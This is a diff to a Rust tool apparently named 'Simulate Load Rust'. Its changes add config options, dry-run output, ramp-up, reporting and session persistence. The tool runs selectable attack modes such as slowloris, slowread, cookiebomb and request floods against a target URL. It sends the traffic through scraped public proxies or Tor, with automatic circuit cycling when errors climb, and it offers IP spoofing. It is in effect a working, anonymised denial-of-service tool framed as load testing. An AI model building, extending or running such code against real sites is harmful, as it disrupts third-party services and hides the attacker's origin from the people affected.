+                    let _ = CUSTOM_CONTENT_TYPE.set(val);
                 } else if other.starts_with('-') {
                     eprintln!("Unknown option: {}", other);
                     std::process::exit(1);
@@ -1879,11 +2455,32 @@ async fn main() {
         }
     }
 
-    let mut target_url = positional.get(0).cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
+    let mut target_url = positional.first().cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
     let mut mode_str = positional.get(1).cloned().unwrap_or_else(|| "scrape".to_string());
     let mut attack_str = positional.get(2).cloned().unwrap_or_else(|| "normal".to_string());
     let mut concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
     let mut duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);
+
+    // Override with env var defaults (env vars take priority over positional defaults but not CLI flags)
+    if let Ok(env_target) = std::env::var("SIMULATE_LOAD_TARGET") {
+        if positional.is_empty() { target_url = env_target; }
+    }
+    if let Ok(env_mode) = std::env::var("SIMULATE_LOAD_MODE") {
+        if positional.get(1).is_none() { mode_str = env_mode; }
+    }
+    if let Ok(env_attack) = std::env::var("SIMULATE_LOAD_ATTACK") {
+        if positional.get(2).is_none() { attack_str = env_attack; }
+    }
+    if let Ok(env_conc) = std::env::var("SIMULATE_LOAD_CONCURRENCY") {
+        if positional.get(3).is_none() {
+            if let Ok(parsed) = env_conc.parse::<usize>() { concurrency = parsed; }
+        }
+    }
+    if let Ok(env_dur) = std::env::var("SIMULATE_LOAD_DURATION") {
+        if positional.get(4).is_none() {
+            if let Ok(parsed) = env_dur.parse::<u64>() { duration_secs = parsed; }
+        }
+    }
 
     // Load configurations from config file if supplied
     if let Some(path) = &config_file {
@@ -1920,6 +2517,18 @@ async fn main() {
                         "auto_tune" => auto_tune = val.parse().unwrap_or(false),
                         "tui" => tui = val.parse().unwrap_or(false),
                         "spoof_ip" => spoof_ip = val.parse().unwrap_or(false),
+                        "quiet" => quiet = val.parse().unwrap_or(false),
+                        "json" => json_output = val.parse().unwrap_or(false),
+                        "rate_limit" => if let Ok(parsed) = val.parse() { rate_limit = Some(parsed); },
+                        "max_redirects" => if let Ok(parsed) = val.parse() { max_redirects = parsed; },
+                        "rotation_strategy" => rotation_strategy = val.to_string(),
+                        "log_file" => log_file = Some(val.to_string()),
+                        "canary" => canary = val.parse().unwrap_or(false),
+                        "stats_interval" => if let Ok(parsed) = val.parse() { stats_interval_secs = parsed; },
+                        "tor_circuits" => if let Ok(parsed) = val.parse() { tor_circuits = parsed; },
+                        "ramp_up" | "ramp_up_secs" => if let Ok(parsed) = val.parse() { ramp_up_secs = parsed; },
+                        "body" | "post_body" => { let _ = CUSTOM_POST_BODY.set(val.to_string()); },
+                        "content_type" | "content-type" => { let _ = CUSTOM_CONTENT_TYPE.set(val.to_string()); },
                         _ => {}
                     }
                 }
@@ -1934,24 +2543,37 @@ async fn main() {
     }
 
     // Initialize DNS pinning and ClientConfig
-    let pinned_ip = if mode_str == "tor" || mode_str == "scrape-tor" {
+    let pinned_dns = if mode_str == "tor" || mode_str == "scrape-tor" {
         None
     } else {
-        resolve_target_dns(&target_url).await
+        resolve_target_dns(&target_url).await.map(|ip| {
+            let host = Url::parse(&target_url)
+                .ok()
+                .and_then(|u| u.host_str().map(|s| s.to_string()))
+                .unwrap_or_default();
+            (host, ip)
+        })
     };
     let timeout_secs = match attack_str.as_str() {
         "slowloris" | "slowread" => 60,
         _ => 10,
     };
     let config = ClientConfig {
-        pinned_dns: pinned_ip.map(|ip| {
-            let u = Url::parse(&target_url).unwrap_or_else(|_| Url::parse(DEFAULT_TARGET_URL).unwrap());
-            (u.host_str().unwrap_or("").to_string(), ip)
-        }),
+        pinned_dns,
+        max_redirects,
+        tor_circuits,
+        rate_limit,
         pool_max_idle,
         pool_idle_timeout: Duration::from_secs(pool_idle_timeout_secs),
         sni: sni.clone(),
         timeout: Duration::from_secs(timeout_secs),
+        insecure,
+        custom_user_agent: user_agent.clone(),
+        custom_headers: custom_headers.iter().filter_map(|h| {
+            let parts: Vec<&str> = h.splitn(2, ':').collect();
+            if parts.len() == 2 { Some((parts[0].trim().to_string(), parts[1].trim().to_string())) }
+            else { None }
+        }).collect(),
     };
 
     if tor_only {
@@ -1961,6 +2583,7 @@ async fn main() {
             st.target_url = target_url.to_string();
             st.mode = ProxyMode::Tor;
             st.client_config = config.clone();
+            st.verbose = verbose;
         }
         println!("[tor-only] Checking Tor...");
         let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
@@ -1986,14 +2609,12 @@ async fn main() {
 
         // Probe domain
         let state = Arc::new(Mutex::new(AppState::new()));
-        if mode_str == "tor" || mode_str == "scrape-tor" {
-            if tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some() {
-                println!("  [verify] Configuring Tor parameters via Control Port ({})...", tor_control);
-                if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
-                    eprintln!("  [verify] Warning: Failed to configure Tor via Control Port: {}", e);
-                } else {
-                    println!("  [verify] Tor parameters applied successfully.");
-                }
+        if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
+            println!("  [verify] Configuring Tor parameters via Control Port ({})...", tor_control);
+            if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
+                eprintln!("  [verify] Warning: Failed to configure Tor via Control Port: {}", e);
+            } else {
+                println!("  [verify] Tor parameters applied successfully.");
             }
         }
         {
@@ -2002,27 +2623,10 @@ async fn main() {
             st.load_concurrency = concurrency;
             st.custom_selector = custom_selector.clone();
             st.client_config = config.clone();
+            st.verbose = verbose;
             st.tor_proxy = tor_proxy.clone();
-            st.attack_mode = match attack_str.as_str() {
-                "bandwidth" => AttackMode::Bandwidth,
-                "slowread" => AttackMode::SlowRead,
-                "imageopt" => AttackMode::ImageOpt,
-                "largepost" => AttackMode::LargePost,
-                "assetspray" => AttackMode::AssetSpray,
-                "rangereq" => AttackMode::RangeReq,
-                "cookiebomb" => AttackMode::CookieBomb,
-                "ssr" => AttackMode::Ssr,
-                "middleware" => AttackMode::Middleware,
-                "requestflood" => AttackMode::RequestFlood,
-                "notfound" => AttackMode::NotFound,
-                "slowloris" => AttackMode::Slowloris,
-                _ => AttackMode::Normal,
-            };
-            match mode_str.as_str() {
-                "tor" => st.mode = ProxyMode::Tor,
-                "scrape-tor" => st.mode = ProxyMode::ScrapeTorFallback,
-                _ => st.mode = ProxyMode::Scrape,
-            }
+            st.attack_mode = AttackMode::from_str(&attack_str);
+            st.mode = ProxyMode::from_str(&mode_str);
         }
 
         println!("[1/1] Probing domain...");
@@ -2067,14 +2671,12 @@ async fn main() {
 
     // Probe domain
     let state = Arc::new(Mutex::new(AppState::new()));
-    if mode_str == "tor" || mode_str == "scrape-tor" {
-        if tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some() {
-            println!("  Configuring Tor parameters via Control Port ({})...", tor_control);
-            if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
-                eprintln!("  Warning: Failed to configure Tor via Control Port: {}", e);
-            } else {
-                println!("  Tor parameters applied successfully.");
-            }
+    if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
+        println!("  Configuring Tor parameters via Control Port ({})...", tor_control);
+        if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
+            eprintln!("  Warning: Failed to configure Tor via Control Port: {}", e);
+        } else {
+            println!("  Tor parameters applied successfully.");
         }
     }
     {
@@ -2085,6 +2687,7 @@ async fn main() {
         st.custom_selector = custom_selector.clone();
         st.client_config = config.clone();
         st.tor_proxy = tor_proxy.clone();
+        st.verbose = verbose;
         st.attack_mode = match attack_str.as_str() {
             "bandwidth" => AttackMode::Bandwidth,
             "slowread" => AttackMode::SlowRead,
@@ -2151,6 +2754,12 @@ async fn main() {
         }
         Some(prox_list) => {
             println!("  Got {} proxies", prox_list.len());
+            // Warm up Tor circuits when --tor-proxy is used with Tor mode
+            if matches!(mode_str.as_str(), "tor" | "scrape-tor") && tor_proxy.is_some() {
+                println!("  Warming {} Tor circuits...", tor_circuits);
+                warm_tor_circuits(&prox_list, &target_url, timeout_secs, 1).await;
+                println!("  Tor circuits ready.");
+            }
             if let Some(ref path) = save_proxies {
                 let content = prox_list.join("\n");
                 if let Err(e) = std::fs::write(path, content) {
@@ -2160,6 +2769,54 @@ async fn main() {
                 }
             }
             if dry_run {
+                println!("  [DRY RUN] Effective configuration:");
+                println!("    Target: {}", target_url);
+                println!("    Mode: {}", mode_str);
+                println!("    Attack: {}", attack_str);
+                println!("    Concurrency: {}", concurrency);
+                println!("    Duration: {}s", duration_secs);
+                println!("    Delay: {}ms  Jitter: {}ms", delay_ms, jitter_ms);
+                if ramp_up_secs > 0 {
+                    println!("    Ramp-up: {}s", ramp_up_secs);
+                }
+                if let Some(body) = CUSTOM_POST_BODY.get() {
+                    println!("    Custom body: {}..", &body[..body.len().min(60)]);
+                }
+                if let Some(ct) = CUSTOM_CONTENT_TYPE.get() {
+                    println!("    Content-Type: {}", ct);
+                }
+                println!("    Proxies found: {}", prox_list.len());
+                println!("    Rotation: {}", rotation_strategy);
+                if let Some(rate) = rate_limit {
+                    println!("    Rate limit: {} req/s", rate);
+                }
+                println!("    Max redirects: {}", config.max_redirects);
+                println!("    Timeout: {:?}", config.timeout);
+                println!("    Pool idle timeout: {:?}", config.pool_idle_timeout);
+                println!("    Tor circuits: {}", config.tor_circuits);
+                println!("    Max errors: {}", max_errors.unwrap_or(999999));
+                println!("    SSL verify: {}", !config.insecure);
+                println!("    IP spoofing: {}", spoof_ip);
+                println!("    Verbose: {}", verbose);
+                if let Some(ref ua) = user_agent {
+                    println!("    Custom UA: {}", ua);
+                }
+                if !custom_headers.is_empty() {
+                    println!("    Custom headers: {}", custom_headers.len());
+                }
+                if let Some(ref lf) = log_file {
+                    println!("    Log file: {}", lf);
+                }
+                if canary {
+                    println!("    Canary: enabled");
+                }
+                if quiet {
+                    println!("    Quiet mode: enabled");
+                }
+                if json_output {
+                    println!("    JSON output: enabled");
+                }
+                println!();
                 println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                 // Write CSV output if requested
                 if let Some(path) = &output_csv {
@@ -2167,11 +2824,24 @@ async fn main() {
                 }
                 return;
             }
-            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list, &config)));
+            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list, &config, &rotation_strategy)));
             println!("[3/3] Running load for {}s...", duration_secs);
             {
                 let mut s_vec = Vec::with_capacity(prox_list.len());
-                for _ in 0..prox_list.len() {
+                // Try to load persisted sessions from file (hash-based naming)
+                let mut h = DefaultHasher::new();
+                h.write(target_url.as_bytes());
+                let safe_name = format!("sessions_{:x}.json", h.finish());
+                if let Ok(session_data) = std::fs::read_to_string(&safe_name) {
+                    let sessions: Vec<String> = serde_json::from_str(&session_data).unwrap_or_else(|_| vec![]);
+                    for (i, sess) in sessions.iter().enumerate() {
+                        if i < prox_list.len() {
+                            s_vec.push(std::sync::Mutex::new(sess.clone()));
+                        }
+                    }
+                }
+                // Fill remaining with empty sessions
+                while s_vec.len() < prox_list.len() {
                     s_vec.push(std::sync::Mutex::new(String::new()));
                 }
                 state.lock().await.sessions = Arc::new(s_vec);
@@ -2181,7 +2851,48 @@ async fn main() {
                 st.stats.clone()
             };
             stats.concurrency.store(concurrency, Ordering::Relaxed);
+    // Canary: run a single probe request before the actual load test
+    if canary {
+        println!("  Running canary health check...");
+        let canary_client = match reqwest::Client::builder()
+            .timeout(Duration::from_secs(10))
+            .redirect(reqwest::redirect::Policy::none())
+            .build() {
+            Ok(c) => c,
+            Err(e) => {
+                eprintln!("  WARNING: Failed to build canary client: {}", e);
+                reqwest::Client::new()
+            }
+        };
+        match canary_client.get(&target_url).send().await {
+            Ok(resp) => {
+                let status = resp.status();
+                let body_len = resp.content_length().unwrap_or(0);
+                println!("  Canary: {} {} ({} bytes)", status, target_url, body_len);
+                if !status.is_success() {
+                    eprintln!("  WARNING: Canary returned non-success status {}", status);
+                }
+            }
+            Err(e) => {
+                eprintln!("  WARNING: Canary failed: {}", e);
+            }
+        }
+        println!("  Canary complete. Starting load test...");
+    }
+
             stats.running.store(true, Ordering::Relaxed);
+            
+            // Set up Ctrl+C handler for graceful shutdown
+            let running_clone = stats.running.clone();
+            tokio::spawn(async move {
+                if let Err(e) = signal::ctrl_c().await {
+                    eprintln!("Failed to listen for Ctrl+C: {}", e);
+                    return;
+                }
+                eprintln!("
+  [Ctrl+C received] Shutting down gracefully...");
+                running_clone.store(false, Ordering::Relaxed);
+            });
             
             let state_clone = state.clone();
             let pool_clone = pool.clone();
@@ -2189,7 +2900,8 @@ async fn main() {
             let start = Instant::now();
             let mut elapsed_secs = duration_secs;
             tokio::spawn(run_load(state_clone.clone(), pool_clone, stats_clone, delay_ms, max_errors));
-            tokio::spawn(listen_stdin(state_clone));
+            tokio::spawn(listen_stdin(state_clone.clone()));
+            tokio::spawn(ramp_up_concurrency(state_clone, concurrency, ramp_up_secs));
 
             // Adaptive Tor Circuit Cycling Background Loop
             // Cycles circuits based on observed error rate:
@@ -2201,7 +2913,18 @@ async fn main() {
                 let stats_tor = stats.clone();
                 tokio::spawn(async move {
                     // Check if Tor Control Port is reachable before starting loop
-                    if tokio::net::TcpStream::connect(&tor_ctrl).await.is_ok() {
+                    // Try both TCP and Unix socket paths
+                    let control_reachable = match resolve_control_addr(&tor_ctrl) {
+                        Ok((ref addr, ref typ)) => {
+                            if typ == "unix" {
+                                tokio::net::UnixStream::connect(addr).await.is_ok()
+                            } else {
+                                tokio::net::TcpStream::connect(addr).await.is_ok()
+                            }
+                        }
+                        Err(_) => false,
+                    };
+                    if control_reachable {
                         let mut last_total_reqs: u64 = 0;
                         let mut last_errors: u64 = 0;
                         while stats_tor.running.load(Ordering::Relaxed) {
@@ -2232,6 +2955,10 @@ async fn main() {
                             
                             if stats_tor.running.load(Ordering::Relaxed) {
                                 let _ = cycle_tor_circuit(&tor_ctrl).await;
+                                if cycle_interval < 30 {
+                                    // Sleep briefly before cycling to let the new circuit build
+                                    tokio::time::sleep(Duration::from_secs(cycle_interval)).await;
+                                }
                             }
                         }
                     } else {
@@ -2251,8 +2978,14 @@ async fn main() {
                         tokio::time::sleep(Duration::from_secs(60)).await;
                         if !stats_refresh.running.load(Ordering::Relaxed) { break; }
                         if let Some(new_proxies) = get_proxies(ProxyMode::Scrape, &state_refresh).await {
-                            let mut pool_lock = pool_refresh.lock().unwrap();
-                            let fresh_pool = ProxyPool::new(&new_proxies, &config_refresh);
+                            let mut pool_lock = match pool_refresh.lock() {
+                                Ok(guard) => guard,
+                                Err(e) => {
+                                    eprintln!("  Pool refresh lock poisoned: {}", e);
+                                    continue;
+                                }
+                            };
+                            let fresh_pool = ProxyPool::new(&new_proxies, &config_refresh, &rotation_strategy);
                             pool_lock.clients.extend(fresh_pool.clients);
                             pool_lock.labels.extend(fresh_pool.labels);
                             let new_n = pool_lock.clients.len();
@@ -2304,7 +3037,7 @@ async fn main() {
             let mut last_time = start;
 
             while start.elapsed().as_secs() < duration_secs {
-                tokio::time::sleep(Duration::from_millis(1000)).await;
+                tokio::time::sleep(Duration::from_secs(stats_interval_secs)).await;
                 let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                 let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                 let cur_errors = stats.errors.load(Ordering::Relaxed);
@@ -2332,6 +3065,9 @@ async fn main() {
                     println!("========================================================================");
                     println!("   Target URL:  {}", target_url);
                     println!("   Attack Mode: {} | Concurrency: {} | Duration: {}s", attack_str, active_concurrency, duration_secs);
+                    if ramp_up_secs > 0 {
+                        println!("   Ramp-up: {}s", ramp_up_secs);
+                    }
                     if let Some((ref host, ip)) = config.pinned_dns {
                         println!("   DNS Pinning: Enabled ({}) -> IP: {}", host, ip);
                     } else {
@@ -2341,7 +3077,7 @@ async fn main() {
                     let pct = (elapsed as f64 / duration_secs as f64 * 100.0).min(100.0) as usize;
                     let filled = pct / 4;
                     let empty = 25 - filled;
-                    let bar: String = std::iter::repeat("█").take(filled).chain(std::iter::repeat("░").take(empty)).collect();
+                    let bar: String = std::iter::repeat_n("█", filled).chain(std::iter::repeat_n("░", empty)).collect();
                     println!("   [Progress]   [{}] {}% (Elapsed: {}s)", bar, pct, elapsed);
                     println!("========================================================================");
                     println!("   [Metrics]");
@@ -2371,7 +3107,7 @@ async fn main() {
                         stats.status_other.load(Ordering::Relaxed)
                     );
                     println!("========================================================================");
-                } else {
+                } else if !quiet {
                     println!(
                         "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                         elapsed, req_rate, byte_rate, avg_latency, p50, p99,
@@ -2390,9 +3126,11 @@ async fn main() {
                 last_bytes = cur_bytes;
                 last_time = now;
 
-                if max_errors.is_some() && cur_errors >= max_errors.unwrap() {
-                    elapsed_secs = start.elapsed().as_secs().max(1);
-                    break;
+                if let Some(max_err) = max_errors {
+                    if cur_errors >= max_err {
+                        elapsed_secs = start.elapsed().as_secs().max(1);
+                        break;
+                    }
                 }
             }
             stats.running.store(false, Ordering::Relaxed);
@@ -2420,10 +3158,126 @@ async fn main() {
                 stats.error_connect.load(Ordering::Relaxed),
                 stats.error_other.load(Ordering::Relaxed)
             );
-            println!("  {}", final_stats);
+            if !quiet {
+                println!("  {}", final_stats);
+            }
+            if let Some(ref log_path) = log_file {
+                if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
+                    use std::io::Write;
+                    let _ = writeln!(file, "[{}] {}", elapsed_secs, final_stats);
+                }
+            }
+            if json_output {
+                // Output JSON to stdout
+                let json = serde_json::json!({
+                    "target_url": target_url,
+                    "mode": mode_str,
+                    "attack_mode": attack_str,
+                    "concurrency": concurrency,
+                    "duration_secs": duration_secs,
+                    "elapsed_secs": elapsed_secs,
+                    "total_requests": final_reqs,
+                    "total_bytes": final_bytes,
+                    "bytes_per_second": final_bytes as f64 / elapsed_secs as f64,
+                    "requests_per_second": final_reqs as f64 / elapsed_secs as f64,
+                    "avg_latency_ms": final_avg_latency,
+                    "p50_latency_ms": p50,
+                    "p90_latency_ms": p90,
+                    "p95_latency_ms": p95,
+                    "p99_latency_ms": p99,
+                    "status_2xx": stats.status_2xx.load(Ordering::Relaxed),
+                    "status_3xx": stats.status_3xx.load(Ordering::Relaxed),
+                    "status_4xx": stats.status_4xx.load(Ordering::Relaxed),
+                    "status_5xx": stats.status_5xx.load(Ordering::Relaxed),
+                    "status_other": stats.status_other.load(Ordering::Relaxed),
+                    "errors": stats.errors.load(Ordering::Relaxed),
+                    "error_timeout": stats.error_timeout.load(Ordering::Relaxed),
+                    "error_connect": stats.error_connect.load(Ordering::Relaxed),
+                    "error_other": stats.error_other.load(Ordering::Relaxed),
+                });
+                match serde_json::to_string_pretty(&json) {
+                    Ok(s) => println!("{}", s),
+                    Err(e) => eprintln!("Failed to serialize JSON: {}", e),
+                }
+            }
+            // Persist sessions for next run
+            {
+                let sessions_data = state.lock().await;
+                let sessions: Vec<String> = sessions_data.sessions.iter().map(|s| {
+                    match s.lock() {
+                        Ok(g) => g.clone(),
+                        Err(poisoned) => poisoned.into_inner().clone(),
+                    }
+                }).collect();
+                if let Ok(json) = serde_json::to_string(&sessions) {
+                    let mut h = DefaultHasher::new();
+                    h.write(target_url.as_bytes());
+                    let safe_name = format!("sessions_{:x}.json", h.finish());
+                    let _ = std::fs::write(&safe_name, json);
+                }
+            }
+            
+            // Write detailed report if requested
+            if let Some(ref report_path) = report_file {
+                let report = format!(
+                    "=== Simulate Load Rust — Post-Run Report ===
+                    Generated: {}
+                    
+                    Target: {}
+                    Mode: {}
+                    Attack: {}
+                    Concurrency: {}
+                    Duration: {}s
+                    
+                    Results:
+                      Total Requests: {}
+                      Total Bytes: {} ({:.2} MB)
+                      Throughput: {:.2} KB/s | {:.2} req/s
+                      
+                      Latency:
+                        Average: {:.1}ms
+                        p50: {}ms | p90: {}ms | p95: {}ms | p99: {}ms
+                        
+                      Status Codes:
+                        2xx: {} | 3xx: {} | 4xx: {} | 5xx: {}
+                        
+                      Errors: {} total
+                        Timeouts: {}
+                        Connection: {}
+                        Other: {}
+                    ",
+                    format_time_now(),
+                    target_url, mode_str, attack_str, concurrency, duration_secs,
+                    final_reqs, final_bytes, final_bytes as f64 / 1024.0 / 1024.0,
+                    final_bytes as f64 / elapsed_secs as f64 / 1024.0, final_reqs as f64 / elapsed_secs as f64,
+                    final_avg_latency, p50, p90, p95, p99,
+                    stats.status_2xx.load(Ordering::Relaxed),
+                    stats.status_3xx.load(Ordering::Relaxed),
+                    stats.status_4xx.load(Ordering::Relaxed),
+                    stats.status_5xx.load(Ordering::Relaxed),
+                    stats.errors.load(Ordering::Relaxed),
+                    stats.error_timeout.load(Ordering::Relaxed),
+                    stats.error_connect.load(Ordering::Relaxed),
+                    stats.error_other.load(Ordering::Relaxed),
+                );
+                if let Ok(mut file) = std::fs::File::create(report_path) {
+                    use std::io::Write;
+                    let _ = file.write_all(report.as_bytes());
+                    println!("  Report written to: {}", report_path);
+                }
+            }
+            
             if let Some(ref path) = output_csv {
-                write_results_csv(path, &target_url, &status, &prox_list, concurrency, &attack_str,
-                    final_reqs, final_bytes, elapsed_secs);
+                write_results_csv(path, ResultsCsvParams {
+                    target: &target_url,
+                    status: &status,
+                    proxies: &prox_list,
+                    concurrency,
+                    attack: &attack_str,
+                    total_reqs: final_reqs,
+                    total_bytes: final_bytes,
+                    duration: elapsed_secs,
+                });
             }
         }
     }
